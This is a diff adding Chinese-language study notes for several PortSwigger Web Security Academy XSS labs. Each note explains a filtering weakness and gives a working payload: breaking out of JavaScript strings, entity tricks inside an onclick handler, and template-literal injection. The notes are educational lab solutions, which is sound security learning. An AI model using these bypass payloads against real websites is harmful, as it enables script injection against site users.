@@ -753,6 +753,7 @@ https://ac501f4c1e11ddbac0d923cd00260062.web-security-academy.net/?%27accesskey=
 To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 
 
 ### 題目解釋
+直接把 parameter 塞進 JS 中
 
 ### 解答
 發現輸入
@@ -774,3 +775,122 @@ GET /?search=123"<script>alert(1)</script><script>alert(1)</script> HTTP/1.1
 ```
 
 就解了
+
+
+## [Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)
+### 題目敘述
+ This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
+
+To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 
+### 題目解釋
+沒有 Encode `\`
+
+### 解答
+
+先用最普通的 Payload 觀察
+
+```
+var searchTerms = '&lt;script&gt;alert(1)&lt;/script&gt;';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+```
+
+輸入後的東西會先被 HTML Entity Encode，然後再被 `encodeURIComponent(searchTerms)` URL Encode
+
+發現單引號 `'` 會被 Escape 成 `\'`，但是 `\` 可以直接吃進去
+
+所以 Payload
+
+```
+123\'+alert(1); //
+```
+
+
+## [Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
+### 題目敘述
+ This lab contains a stored cross-site scripting vulnerability in the comment functionality.
+
+To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 
+### 題目解釋
+- **HTML 的 event 裡面不認 string 的 escape \\**
+- **如果需要 escape 的話需要用 HTML Entity**
+
+### 解答
+
+看起來重點出在放網址後，後面的 Tracker
+
+```
+http://aaa"123
+```
+
+後面會變成
+
+```
+<a id="author" href="http://aaa&quot;123" onclick="var tracker={track(){}};tracker.track('http://aaa&quot;123');">
+```
+
+發現單引號會被 Escape
+
+不過需要注意
+
+```
+"var tracker={track(){}};tracker.track('http://aaa?\'');"
+```
+
+這種狀況的 `\'` 會被外面的 `"` 吃掉，所以裡面的字串是
+
+```
+"var tracker={track(){}};tracker.track('http://aaa?'');"
+```
+
+有一個超級重要的特性！
+
+- **HTML 的 event 裡面不認 string 的 escape \\**
+- **如果需要 escape 的話需要用 HTML Entity**
+
+也就是說，我們希望構成 (`'` 是 `&apos;`)
+
+```
+onclick="var tracker={track(){}};tracker.track('http://aaa&apos;+alert(1)+&apos;');"
+```
+
+所以送入
+```
+http://aaa&apos;+alert(1)+&apos;
+```
+
+也就是
+
+```
+http%3A%2F%2Faaa%26apos%3B%2Balert%281%29%2B%26apos%3B
+```
+
+## [Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)
+### 題目敘述
+ This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string. 
+ 
+### 題目解釋
+Template literals，類似 Py 的 f-string
+### 解答
+
+一樣從最基本的開始
+```
+var message = `0 search results for '\u003cscript\u003ealert(1)\u003c/script\u003e'`;
+document.getElementById('searchMessage').innerText = message;
+```
+
+發現他是用 
+```
+``
+```
+所以可以用
+
+```
+`${alert(1)}`
+```
+
+類似 Python 的 f-string 方法來解
+
+
+
+
+
